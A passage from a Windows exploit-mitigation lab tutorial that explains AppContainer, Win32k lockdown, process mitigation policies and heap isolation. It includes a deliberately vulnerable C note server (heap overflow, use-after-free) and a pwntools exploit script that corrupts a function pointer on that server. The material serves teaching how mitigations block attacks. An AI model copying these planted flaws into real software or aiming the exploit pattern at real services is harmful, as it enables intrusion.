#  Capabilities: 0
#Integrity Level:
#  Level: Low (0x1000)
#  Elevated: NO

.\bin\verify_lpac.exe $PID
#=== Process 4424 Security Analysis ===
#AppContainer Status:
#  IsAppContainer: NO
#Integrity Level:
#  Level: Medium (0x2000)
#  Elevated: NO
```

**Key Observations**:

- LPAC process runs at Low integrity (0x1000) vs Medium (0x2000)
- Zero capabilities = maximum restriction
- AppContainer SID uniquely identifies the sandbox
- Normal processes have no AppContainer isolation

#### Win32k Filtering (Win32k Lockdown)

**What is Win32k Filtering?**:

- Blocks access to win32k.sys from sandboxed processes
- win32k.sys is a major kernel attack surface
- Used by Chrome, Edge, Firefox renderers

**Why Block Win32k?**:

```text
win32k.sys Attack Surface:
--------------------------------------------------------

- ~1200 syscalls (NtUser*, NtGdi*)
- Complex state machine (windows, menus, hooks)
- Historical source of many kernel vulns
- 2015-2024: 100+ win32k CVEs

Browser Renderer:
- Doesn't need to create windows (compositor does that)
- Doesn't need GDI (uses GPU)
- Blocking win32k removes huge attack surface
```

**Win32k Filter Impact**:

```text
With Win32k Filtering Enabled:
----------------------------------------------
Process CANNOT:
- Create or manipulate windows
- Use GDI drawing functions
- Set Windows hooks
- Access clipboard directly
- Use USER32/GDI32 APIs

Process MUST:
- Use IPC to broker process for UI
- Use Mojo/IPC for compositor
- Render to shared memory/GPU

Security Benefit:
- 1200+ syscalls removed from attack surface
- win32k kernel exploits don't work
- Only syscall filtering in ntoskrnl matters
```

#### Process Mitigation Policy Summary

**All Process-Level Mitigations**:

```c
// Complete process mitigation policy query and set example
// Compile: cl /Zi /W4 src\mitigation_policy.c /Fe:bin\mitigation_policy.exe

#include <windows.h>
#include <stdio.h>

void PrintDEPPolicy(PROCESS_MITIGATION_DEP_POLICY* policy) {
    printf("DEP Policy:\n");
    printf("  Enable: %d\n", policy->Enable);
    printf("  DisableAtlThunkEmulation: %d\n", policy->DisableAtlThunkEmulation);
    printf("  Permanent: %d\n", policy->Permanent);
}

void PrintASLRPolicy(PROCESS_MITIGATION_ASLR_POLICY* policy) {
    printf("ASLR Policy:\n");
    printf("  EnableBottomUpRandomization: %d\n", policy->EnableBottomUpRandomization);
    printf("  EnableForceRelocateImages: %d\n", policy->EnableForceRelocateImages);
    printf("  EnableHighEntropy: %d\n", policy->EnableHighEntropy);
    printf("  DisallowStrippedImages: %d\n", policy->DisallowStrippedImages);
}

void PrintDynamicCodePolicy(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY* policy) {
    printf("Dynamic Code Policy (ACG):\n");
    printf("  ProhibitDynamicCode: %d\n", policy->ProhibitDynamicCode);
    printf("  AllowThreadOptOut: %d\n", policy->AllowThreadOptOut);
    printf("  AllowRemoteDowngrade: %d\n", policy->AllowRemoteDowngrade);
}

void PrintSystemCallDisablePolicy(PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY* policy) {
    printf("System Call Disable Policy (Win32k Lockdown):\n");
    printf("  DisallowWin32kSystemCalls: %d\n", policy->DisallowWin32kSystemCalls);
}

void PrintControlFlowGuardPolicy(PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY* policy) {
    printf("Control Flow Guard Policy:\n");
    printf("  EnableControlFlowGuard: %d\n", policy->EnableControlFlowGuard);
    printf("  EnableExportSuppression: %d\n", policy->EnableExportSuppression);
    printf("  StrictMode: %d\n", policy->StrictMode);
}

void PrintSignaturePolicy(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY* policy) {
    printf("Binary Signature Policy (CIG):\n");
    printf("  MicrosoftSignedOnly: %d\n", policy->MicrosoftSignedOnly);
    printf("  StoreSignedOnly: %d\n", policy->StoreSignedOnly);
    printf("  MitigationOptIn: %d\n", policy->MitigationOptIn);
}

void PrintImageLoadPolicy(PROCESS_MITIGATION_IMAGE_LOAD_POLICY* policy) {
    printf("Image Load Policy:\n");
    printf("  NoRemoteImages: %d\n", policy->NoRemoteImages);
    printf("  NoLowMandatoryLabelImages: %d\n", policy->NoLowMandatoryLabelImages);
    printf("  PreferSystem32Images: %d\n", policy->PreferSystem32Images);
}

void PrintChildProcessPolicy(PROCESS_MITIGATION_CHILD_PROCESS_POLICY* policy) {
    printf("Child Process Policy:\n");
    printf("  NoChildProcessCreation: %d\n", policy->NoChildProcessCreation);
    printf("  AllowSecureProcessCreation: %d\n", policy->AllowSecureProcessCreation);
}

void QueryAllMitigations(HANDLE hProcess) {
    PROCESS_MITIGATION_DEP_POLICY depPolicy = {0};
    PROCESS_MITIGATION_ASLR_POLICY aslrPolicy = {0};
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dynamicCodePolicy = {0};
    PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY syscallPolicy = {0};
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = {0};
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sigPolicy = {0};
    PROCESS_MITIGATION_IMAGE_LOAD_POLICY imageLoadPolicy = {0};
    PROCESS_MITIGATION_CHILD_PROCESS_POLICY childProcPolicy = {0};

    printf("=== Process Mitigation Policies ===\n\n");

    // Query DEP
    if (GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy,
                                   &depPolicy, sizeof(depPolicy))) {
        PrintDEPPolicy(&depPolicy);
    } else {
        printf("Failed to query DEP policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query ASLR
    if (GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy,
                                   &aslrPolicy, sizeof(aslrPolicy))) {
        PrintASLRPolicy(&aslrPolicy);
    } else {
        printf("Failed to query ASLR policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Dynamic Code (ACG)
    if (GetProcessMitigationPolicy(hProcess, ProcessDynamicCodePolicy,
                                   &dynamicCodePolicy, sizeof(dynamicCodePolicy))) {
        PrintDynamicCodePolicy(&dynamicCodePolicy);
    } else {
        printf("Failed to query Dynamic Code policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query System Call Disable (Win32k)
    if (GetProcessMitigationPolicy(hProcess, ProcessSystemCallDisablePolicy,
                                   &syscallPolicy, sizeof(syscallPolicy))) {
        PrintSystemCallDisablePolicy(&syscallPolicy);
    } else {
        printf("Failed to query System Call Disable policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query CFG
    if (GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy,
                                   &cfgPolicy, sizeof(cfgPolicy))) {
        PrintControlFlowGuardPolicy(&cfgPolicy);
    } else {
        printf("Failed to query CFG policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Signature Policy (CIG)
    if (GetProcessMitigationPolicy(hProcess, ProcessSignaturePolicy,
                                   &sigPolicy, sizeof(sigPolicy))) {
        PrintSignaturePolicy(&sigPolicy);
    } else {
        printf("Failed to query Signature policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Image Load Policy
    if (GetProcessMitigationPolicy(hProcess, ProcessImageLoadPolicy,
                                   &imageLoadPolicy, sizeof(imageLoadPolicy))) {
        PrintImageLoadPolicy(&imageLoadPolicy);
    } else {
        printf("Failed to query Image Load policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Child Process Policy
    if (GetProcessMitigationPolicy(hProcess, ProcessChildProcessPolicy,
                                   &childProcPolicy, sizeof(childProcPolicy))) {
        PrintChildProcessPolicy(&childProcPolicy);
    } else {
        printf("Failed to query Child Process policy: %d\n", GetLastError());
    }
}

BOOL SetProcessMitigations(HANDLE hProcess) {
    // Example: Enable ACG (Arbitrary Code Guard)
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dynamicCodePolicy = {0};
    dynamicCodePolicy.ProhibitDynamicCode = 1;

    if (!SetProcessMitigationPolicy(ProcessDynamicCodePolicy,
                                    &dynamicCodePolicy,
                                    sizeof(dynamicCodePolicy))) {
        printf("Failed to set Dynamic Code policy: %d\n", GetLastError());
        return FALSE;
    }

    // Example: Enable Win32k System Call Disable
    PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY syscallPolicy = {0};
    syscallPolicy.DisallowWin32kSystemCalls = 1;

    if (!SetProcessMitigationPolicy(ProcessSystemCallDisablePolicy,
                                    &syscallPolicy,
                                    sizeof(syscallPolicy))) {
        printf("Failed to set System Call Disable policy: %d\n", GetLastError());
        return FALSE;
    }

    // Example: Disable child process creation
    PROCESS_MITIGATION_CHILD_PROCESS_POLICY childProcPolicy = {0};
    childProcPolicy.NoChildProcessCreation = 1;

    if (!SetProcessMitigationPolicy(ProcessChildProcessPolicy,
                                    &childProcPolicy,
                                    sizeof(childProcPolicy))) {
        printf("Failed to set Child Process policy: %d\n", GetLastError());
        return FALSE;
    }

    printf("Successfully set mitigation policies!\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    HANDLE hProcess = GetCurrentProcess();

    if (argc > 1 && strcmp(argv[1], "--set") == 0) {
        printf("Setting mitigation policies...\n\n");
        SetProcessMitigations(hProcess);
        printf("\n");
    }

    // Query another process by PID
    if (argc > 1 && strcmp(argv[1], "--pid") == 0 && argc > 2) {
        DWORD pid = atoi(argv[2]);
        HANDLE hTargetProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

        if (hTargetProcess) {
            printf("Querying Process PID %d mitigations...\n\n", pid);
            QueryAllMitigations(hTargetProcess);
            CloseHandle(hTargetProcess);
        } else {
            printf("Failed to open process %d: %d\n", pid, GetLastError());
        }
    } else {
        printf("Querying current process mitigations...\n\n");
        QueryAllMitigations(hProcess);
    }

    return 0;
}

// Usage examples:
// mitigation_policy.exe              - Query current process
// mitigation_policy.exe --set        - Set mitigations then query
// mitigation_policy.exe --pid 1234   - Query process with PID 1234
```

**Testing Mitigation Policies**:

```bash
# Compile the mitigation policy tool
cl /Zi /W4 src\mitigation_policy.c /Fe:bin\mitigation_policy.exe

# Query current process mitigations
.\bin\mitigation_policy.exe

# Set mitigations on current process (some may fail if already set)
.\bin\mitigation_policy.exe --set

# Query a specific process
$notepadPid = (Get-Process notepad | Select-Object -First 1).Id
.\bin\mitigation_policy.exe --pid $notepadPid

# Compare browser processes (shows main vs renderer process differences)
Get-Process chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "`n=== $($_.ProcessName) PID $($_.Id) ==="
    .\bin\mitigation_policy.exe --pid $_.Id
}
# Note: Renderer/sandbox processes will show ACG=1, Win32k=1, CIG=1, NoChildProcess=1
# Main browser processes will have fewer mitigations enabled

# Check system-wide mitigation policies (only shows if configured via registry/Exploit Guard)
Get-ProcessMitigation -System

# Query running process by PID (more reliable for actual runtime mitigations)
$edgePid = (Get-Process msedge | Select-Object -First 1).Id
Get-ProcessMitigation -Id $edgePid

# View specific mitigation categories with details
$mitigation = Get-ProcessMitigation -Id $edgePid
$mitigation.Dep
$mitigation.Aslr
$mitigation.DynamicCode
$mitigation.SystemCall
$mitigation.Cfg
```

**Expected Output Analysis**:

```text
Browser Renderer/Sandbox Process (e.g., Edge PID 9520):
--------------------------------------------------------
DEP: ON (Enable=1, Permanent=1)
ASLR: Full (BottomUp=1, ForceRelocateImages=1, HighEntropy=1)
ACG: ON (ProhibitDynamicCode=1) - Blocks JIT/dynamic code
Win32k Lockdown: ON (DisallowWin32kSystemCalls=1) - No GUI syscalls
CFG: ON (EnableControlFlowGuard=1)
CIG: ON (MicrosoftSignedOnly=1) - Only MS-signed DLLs
Image Load: Restricted (NoRemoteImages=1, NoLowMandatoryLabelImages=1)
Child Process: Blocked (NoChildProcessCreation=1)

Browser Main/Utility Process (e.g., Edge PID 5512):
----------------------------------------------------
DEP: ON (Enable=1, Permanent=1)
ASLR: Full (BottomUp=1, HighEntropy=1)
ACG: OFF (BlockDynamicCode=OFF) - Allows JIT for JavaScript
Win32k Lockdown: OFF - Needs GUI access
CFG: ON (Enable=ON)
CIG: OFF - Can load third-party extensions
Image Load: Unrestricted
Child Process: Allowed - Can spawn renderer processes

Legacy Application (e.g., older Win32 app):
-------------------------------------------
DEP: ON (but may not be permanent)
ASLR: Partial (BottomUp=ON, but ForceRelocateImages=OFF, HighEntropy=OFF)
ACG: OFF
Win32k Lockdown: OFF
CFG: OFF
CIG: OFF
Image Load: Unrestricted
Child Process: Unrestricted
```

### Windows Defender Exploit Guard

**What is Exploit Guard?**:

- Successor to EMET (Enhanced Mitigation Experience Toolkit)
- Built into Windows 10 1709+
- Configurable per-application mitigations
- Part of Windows Security / Microsoft Defender

**Key Features**:

| Feature                        | Protection                    |
| ------------------------------ | ----------------------------- |
| Attack Surface Reduction (ASR) | Blocks Office macros, scripts |
| Network Protection             | Blocks malicious URLs         |
| Controlled Folder Access       | Ransomware protection         |
| Exploit Protection             | Per-app mitigations           |

### Browser Heap Isolation Simulation

Browsers use "PartitionAlloc" (Chromium) or "MemGC" (Edge) to isolate different
object types into separate heaps. This prevents a UAF in one type from being
exploited via allocation of a different type.

Create `src\browser_heap_sim.cpp`:

```cpp
// browser_heap_sim.cpp
// Simulates browser-style heap isolation that prevents type-confusion UAF.
//
// Without isolation: free a DomNode, spray ImageData of same size,
//   attacker controls freed DomNode's vtable -> code execution.
// With isolation: DomNode and ImageData use DIFFERENT heaps,
//   so ImageData CANNOT reclaim DomNode's memory.

#include <windows.h>
#include <stdio.h>
#include <string.h>

HANDLE g_DomHeap;
HANDLE g_ImageHeap;

struct DomNode {
    void (*render)(struct DomNode*);
    char tag[56];  // Total: 64 bytes
};

struct ImageData {
    unsigned char pixels[64];  // Same size as DomNode!
};

void legit_render(struct DomNode* self) {
    printf("[*] Rendering <%s>\n", self->tag);
}

void init_heaps() {
    g_DomHeap = HeapCreate(0, 0, 0);
    g_ImageHeap = HeapCreate(0, 0, 0);
    printf("[*] DOM Heap:   %p\n", g_DomHeap);
    printf("[*] Image Heap: %p\n", g_ImageHeap);
}

void demo_without_isolation() {
    printf("\n=== WITHOUT ISOLATION (single heap) ===\n");
    HANDLE hHeap = GetProcessHeap();

    // Allocate a DomNode
    DomNode* node = (DomNode*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(DomNode));
    node->render = legit_render;
    strcpy(node->tag, "div");
    printf("[*] DomNode at %p, render = %p\n", node, (void*)node->render);
    void* saved_addr = node;

    // Free it (UAF condition)
    HeapFree(hHeap, 0, node);
    printf("[*] Freed DomNode at %p\n", saved_addr);

    // Spray same-sized ImageData on same heap
    // Goal: reclaim the freed DomNode's memory
    int reclaimed = 0;
    for (int i = 0; i < 100; i++) {
        ImageData* img = (ImageData*)HeapAlloc(hHeap, 0, sizeof(ImageData));
        memset(img->pixels, 0x41, sizeof(img->pixels));
        if ((void*)img == saved_addr) {
            printf("[!] ImageData reclaimed DomNode's memory at %p!\n", img);
            printf("[!] node->render is now 0x%p (attacker-controlled)\n",
                   (void*)((DomNode*)img)->render);
            reclaimed = 1;
            break;
        }
    }
    if (!reclaimed)
        printf("[*] Did not reclaim in 100 attempts (heap randomization)\n");
    fflush(stdout);
}

void demo_with_isolation() {
    printf("\n=== WITH ISOLATION (separate heaps) ===\n");
    init_heaps();

    // DomNode allocated on DOM heap
    DomNode* node = (DomNode*)HeapAlloc(g_DomHeap, HEAP_ZERO_MEMORY, sizeof(DomNode));
    node->render = legit_render;
    strcpy(node->tag, "div");
    printf("[*] DomNode at %p (DOM heap)\n", node);
    void* saved_addr = node;

    // Free it
    HeapFree(g_DomHeap, 0, node);
    printf("[*] Freed DomNode at %p\n", saved_addr);

    // Spray ImageData on IMAGE heap — DIFFERENT heap!
    // Can never reclaim DomNode memory because it's on a different heap
    int reclaimed = 0;
    for (int i = 0; i < 100; i++) {
        ImageData* img = (ImageData*)HeapAlloc(g_ImageHeap, 0, sizeof(ImageData));
        memset(img->pixels, 0x41, sizeof(img->pixels));
        if ((void*)img == saved_addr) {
            printf("[!] Should never happen!\n");
            reclaimed = 1;
            break;
        }
    }
    if (!reclaimed)
        printf("[+] ImageData CANNOT reclaim DomNode memory (different heap)\n");
    printf("[+] Type-confusion UAF prevented by heap isolation!\n");
    fflush(stdout);

    HeapDestroy(g_DomHeap);
    HeapDestroy(g_ImageHeap);
}

int main() {
    demo_without_isolation();
    demo_with_isolation();
    return 0;
}
```

**Compile & Run**:

```bash
cd C:\Windows_Mitigations_Lab
cl /EHsc /Zi src\browser_heap_sim.cpp /Fe:bin\browser_heap_sim.exe /link /DEBUG

.\bin\browser_heap_sim.exe
# Expected output:
# === WITHOUT ISOLATION (single heap) ===
# [*] DomNode at 0000018BDD6252E0, render = 00007FF6FCEF1F0A
# [*] Freed DomNode at 0000018BDD6252E0
# [!] ImageData reclaimed DomNode's memory at 0000018BDD6252E0!
# [!] node->render is now 0x4141414141414141 (attacker-controlled)

# === WITH ISOLATION (separate heaps) ===
# [*] DOM Heap:   0000018BDD9D0000
# [*] Image Heap: 0000018BDD970000
# [*] DomNode at 0000018BDD9D0860 (DOM heap)
# [*] Freed DomNode at 0000018BDD9D0860
```

> [!NOTE]
> The single-heap demo may not always reclaim in the first 100 attempts due to heap
> randomization (LFH/Segment Heap). In real browser exploits, attackers spray thousands
> of objects to increase the probability. The key insight is that with separate heaps,
> reclamation is **impossible** regardless of spray count.

### Practical Exercise

#### Task 1: Vulnerable Heap Server and Pwntools Exploitation

To fully understand heap protections, we need a network-facing vulnerable server and pwntools scripts that exploit it — showing how mitigations block real attacks.

##### Vulnerable Heap Server

```c
// vuln_heap_server.c — Network server with heap vulnerabilities
// Demonstrates: heap overflow, UAF, double-free
// Compile: cl /Zi /GS- vuln_heap_server.c /Fe:vuln_heap_server.exe /link ws2_32.lib /DEBUG
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

#define PORT 9998
#define MAX_NOTES 16
#define NOTE_SIZE 64

typedef struct {
    void (*print_func)(struct Note*);
    char data[56];
} Note;

Note *notes[MAX_NOTES] = {0};
HANDLE hHeap;

void print_note(Note *n) {
    printf("[Note] %s\n", n->data);
}

void send_str(SOCKET s, const char *str) {
    send(s, str, (int)strlen(str), 0);
}

void handle_create(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES) {
        send_str(client, "[-] Invalid index\n");
        return;
    }
    notes[idx] = (Note*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Note));
    if (!notes[idx]) {
        send_str(client, "[-] Allocation failed\n");
        return;
    }
    notes[idx]->print_func = print_note;
    char resp[128];
    snprintf(resp, sizeof(resp), "[+] Created note %d at %p\n", idx, notes[idx]);
    send_str(client, resp);
}

void handle_write(SOCKET client, char *buf) {
    // Format: <idx> <size> <data>
    int idx, size;
    if (sscanf(buf, "%d %d", &idx, &size) != 2) {
        send_str(client, "[-] Format: write <idx> <size> <data>\n");
        return;
    }
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    // BUG: No bounds check on size — allows heap overflow!
    // Only 56 bytes available in data[], but user controls size
    char *data_start = buf;
    // Skip past "<idx> <size> "
    int spaces = 0;
    while (*data_start && spaces < 2) {
        if (*data_start == ' ') spaces++;
        data_start++;
    }
    memcpy(notes[idx]->data, data_start, size);  // OVERFLOW!
    send_str(client, "[+] Written\n");
}

void handle_read(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    char resp[256];
    // Leak the function pointer and data
    snprintf(resp, sizeof(resp), "[+] Note %d: func=%p data=%s\n",
             idx, (void*)notes[idx]->print_func, notes[idx]->data);
    send_str(client, resp);
}

void handle_delete(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    HeapFree(hHeap, 0, notes[idx]);
    // BUG: Pointer NOT nulled — UAF possible!
    // notes[idx] = NULL;  // <-- This line is missing!
    send_str(client, "[+] Deleted\n");
}

void handle_use(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    // Calls via function pointer — CFG would validate this
    notes[idx]->print_func(notes[idx]);
    send_str(client, "[+] Used\n");
}

void handle_client(SOCKET client) {
    char buf[512];
    send_str(client, "=== Heap Vuln Server v1.0 ===\n");
    send_str(client, "Commands: create <idx> | write <idx> <size> <data> | "
                     "read <idx> | delete <idx> | use <idx> | quit\n");

    while (1) {
        send_str(client, "> ");
        memset(buf, 0, sizeof(buf));
        int n = recv(client, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;

        // Strip newline
        while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r')) buf[--n] = 0;

        if (strncmp(buf, "create ", 7) == 0)      handle_create(client, buf + 7);
        else if (strncmp(buf, "write ", 6) == 0)   handle_write(client, buf + 6);
        else if (strncmp(buf, "read ", 5) == 0)    handle_read(client, buf + 5);
        else if (strncmp(buf, "delete ", 7) == 0)  handle_delete(client, buf + 7);
        else if (strncmp(buf, "use ", 4) == 0)     handle_use(client, buf + 4);
        else if (strncmp(buf, "quit", 4) == 0)     break;
        else send_str(client, "[-] Unknown command\n");
    }
    closesocket(client);
}

int main() {
    hHeap = HeapCreate(0, 0, 0);
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, 5);

    printf("[*] Listening on port %d\n", PORT);
    printf("[*] Heap handle: %p\n", hHeap);
    printf("[*] print_note func: %p\n", (void*)print_note);
    fflush(stdout);

    while (1) {
        SOCKET client = accept(srv, NULL, NULL);
        printf("[*] Client connected\n");
        fflush(stdout);
        handle_client(client);
        printf("[*] Client disconnected\n");
        fflush(stdout);
    }

    WSACleanup();
    return 0;
}
```

**Compile the server**:

```bash
cd C:\Windows_Mitigations_Lab

# Without mitigations (baseline — exploitable)
cl /Zi /GS- src\vuln_heap_server.c /Fe:bin\vuln_heap_server_no_mit.exe /link ws2_32.lib /DEBUG /DYNAMICBASE:NO /NXCOMPAT:NO

# With heap protections (encoded metadata, safe unlinking)
cl /Zi src\vuln_heap_server.c /Fe:bin\vuln_heap_server_mitigated.exe /link ws2_32.lib /DEBUG
```

##### Heap Overflow Exploitation

```python
#!/usr/bin/env python3
"""
heap_overflow_exploit.py — Pwntools exploit for vuln_heap_server
Demonstrates: Heap overflow to corrupt adjacent note's function pointer.

Scenario:
  - Create two adjacent notes (note 0 and note 1)
  - Overflow note 0's data field (56 bytes) into note 1's struct
  - Overwrite note 1's print_func pointer
  - Call 'use 1' to trigger controlled function call
  - Without protections: attacker controls execution
  - With heap protections: encoded metadata detects corruption on HeapFree
  - With Page Heap: immediate crash on out-of-bounds write
  - With CFG: indirect call validation blocks invalid target

Usage:
  python heap_overflow_exploit.py [TARGET_IP] [PORT] [--debug]
  python heap_overflow_exploit.py 192.168.1.100 9998
  python heap_overflow_exploit.py 127.0.0.1 9998 --debug
"""
from pwn import *
import sys

# --- Configuration ---
TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 9998
DEBUG  = "--debug" in sys.argv

context.log_level = "debug" if DEBUG else "info"
context.arch = "amd64"
context.os = "windows"

def recv_prompt(io):
    """Receive until we get a prompt at the start of a line."""
    # The prompt is "> " at the beginning of a line after a newline
    # We need to receive until we see "\n> " to avoid matching "> " in the banner
    return io.recvuntil(b"\n> ")

def connect():
    """Connect and consume the banner."""
    io = remote(TARGET, PORT)
    recv_prompt(io)  # consume banner + prompt
    return io

def create(io, idx):
    """Create a note at the given index."""
    io.sendline(f"create {idx}".encode())
    resp = recv_prompt(io)
    log.debug(f"Create response: {resp}")
    # Parse the address from '[+] Created note X at 0x...'
    addr = None
    for line in resp.split(b"\n"):
        if b"Created note" in line and b" at " in line:
            try:
                # Extract hex address after "at "
                addr_str = line.split(b"at ")[1].split()[0].strip()
                addr = int(addr_str, 16)
            except (IndexError, ValueError) as e:
                log.debug(f"Failed to parse address: {e}")
    log.info(f"Created note {idx}" + (f" at {hex(addr)}" if addr else " (address not parsed)"))
    return addr

def write_note(io, idx, size, data):
    """Write data to a note with explicit size (for overflow)."""
    payload = f"write {idx} {size} ".encode() + data
    io.sendline(payload)
    try:
        resp = recv_prompt(io)
        log.debug(f"Write response: {resp}")
        return resp
    except EOFError:
        log.critical("Server crashed during write — Page Heap detected overflow!")
        log.success("Page Heap protection is ACTIVE and working!")
        return None

def read_note(io, idx):
    """Read a note and parse the leaked function pointer."""
    io.sendline(f"read {idx}".encode())
    resp = recv_prompt(io)
    log.debug(f"Read response: {resp}")
    func_addr = None
    data_content = None
    for line in resp.split(b"\n"):
        if b"func=" in line:
            try:
                # Parse "func=0x... data=..."
                func_str = line.split(b"func=")[1].split(b" ")[0].strip()
                func_addr = int(func_str, 16)
                if b"data=" in line:
                    data_content = line.split(b"data=")[1].strip()
            except (IndexError, ValueError) as e:
                log.debug(f"Failed to parse func pointer: {e}")
    if func_addr:
        log.info(f"Leaked function pointer: {hex(func_addr)}")
    return func_addr, resp

def delete(io, idx):
    """Delete (free) a note — does NOT null the pointer (UAF)."""
    io.sendline(f"delete {idx}".encode())
    resp = recv_prompt(io)
    return resp

def use(io, idx):
    """Trigger function pointer call on the note."""
    io.sendline(f"use {idx}".encode())
    # Don't recvuntil since the server might crash
    try:
        resp = recv_prompt(io)
        return resp
    except EOFError:
        log.warning("Server crashed (connection closed) — mitigation triggered!")
        return None
    except Exception as e:
        log.warning(f"Timeout or error: {e}")
        return None

def exploit():
    io = connect()

    # Step 1: Create two adjacent notes
    log.info("Step 1: Creating two notes for adjacency")
    addr0 = create(io, 0)
    addr1 = create(io, 1)

    if addr0 and addr1:
        gap = addr1 - addr0
        log.info(f"Gap between notes: {gap} bytes (sizeof(Note) = 64)")
        if gap != 64:
            log.warning(f"Notes are NOT adjacent (gap={gap}). "
                        "Heap randomization may prevent exploitation.")
    else:
        log.warning("Could not parse note addresses — proceeding with blind overflow")

    # Step 2: Read note 1 to see original function pointer
    log.info("Step 2: Leaking note 1's function pointer")
    orig_func, _ = read_note(io, 1)
    if orig_func:
        log.success(f"Original print_func: {hex(orig_func)}")
    else:
        log.warning("Could not leak function pointer — check server response format")

    # Step 3: Overflow note 0 into note 1
    # Note struct layout:
    #   [print_func: 8 bytes][data: 56 bytes] = 64 bytes total
    # Heap layout:
    #   [Note 0: 64 bytes][Heap metadata: 16 bytes][Note 1: 64 bytes]
    # To overflow from note 0's data into note 1's print_func:
    #   - Fill note 0's data[56]
    #   - Overflow through heap metadata (16 bytes)
    #   - Overwrite note 1's print_func (8 bytes)
    log.info("Step 3: Overflowing note 0 to corrupt note 1's function pointer")

    # Calculate overflow size based on actual gap
    if addr0 and addr1:
        gap = addr1 - addr0
        # Distance from note 0's data field to note 1's func ptr
        # note 0 data starts at addr0 + 8 (after func ptr)
        # note 1 func ptr is at addr1
        overflow_size = (addr1 - addr0) - 8 + 8  # -8 for func ptr offset, +8 to overwrite it

        if gap > 1024:
            log.warning(f"Large gap detected ({gap} bytes) — Page Heap likely enabled!")
            log.warning("Page Heap places guard pages between allocations")
            log.warning("Attempting overflow anyway to demonstrate detection...")
        else:
            log.info(f"Calculated overflow size: {overflow_size} bytes")
    else:
        # Blind overflow: assume 16-byte heap metadata
        overflow_size = 56 + 16 + 8  # data + metadata + func ptr
        log.info(f"Blind overflow size (assuming 16-byte heap header): {overflow_size} bytes")

    fake_func_ptr = p64(0x4141414141414141)  # Will cause crash or CFG violation
    overflow_payload = b"A" * (overflow_size - 8) + fake_func_ptr

    log.info(f"Overflow payload size: {len(overflow_payload)} bytes")
    write_result = write_note(io, 0, len(overflow_payload), overflow_payload)

    if write_result is None:
        log.success("=" * 60)
        log.success("PAGE HEAP PROTECTION DETECTED THE OVERFLOW!")
        log.success("Server crashed immediately on out-of-bounds write")
        log.success("This is the BEST case scenario for heap protection")
        log.success("=" * 60)
        io.close()
        return

    # Step 4: Verify corruption by reading note 1
    log.info("Step 4: Verifying corruption of note 1")
    corrupted_func, _ = read_note(io, 1)
    if corrupted_func:
        if corrupted_func == 0x4141414141414141:
            log.success(f"Function pointer corrupted to: {hex(corrupted_func)}")
            log.success("Heap overflow succeeded — NO protection detected!")
        else:
            log.info(f"Function pointer: {hex(corrupted_func)} (may be garbled)")

    # Step 5: Trigger the corrupted function pointer
    log.info("Step 5: Triggering corrupted function pointer via 'use 1'")
    log.info("Expected outcomes:")
    log.info("  No mitigations: crash at 0x4141414141414141 (controlled!)")
    log.info("  Page Heap:      crash on the overflow write itself")
    log.info("  CFG enabled:    STATUS_STACK_BUFFER_OVERRUN (0xC0000409)")
    log.info("  Heap encoding:  crash on HeapFree with STATUS_HEAP_CORRUPTION")

    result = use(io, 1)
    if result is None:
        log.success("Server crashed — mitigation likely triggered")
        log.info("Check server console or WinDbg for:")
        log.info("  0xC0000005 = DEP (tried to execute non-executable page)")
        log.info("  0xC0000409 sub 10 = CFG blocked invalid indirect call")
        log.info("  0xC0000374 = Heap integrity check failed")
    else:
        log.warning("Server survived — function pointer may not have been corrupted")

    io.close()

if __name__ == "__main__":
    exploit()
```

**Testing the heap overflow exploit:**

```bash
# 1. Test without mitigations (baseline — should succeed)
.\bin\vuln_heap_server_no_mit.exe
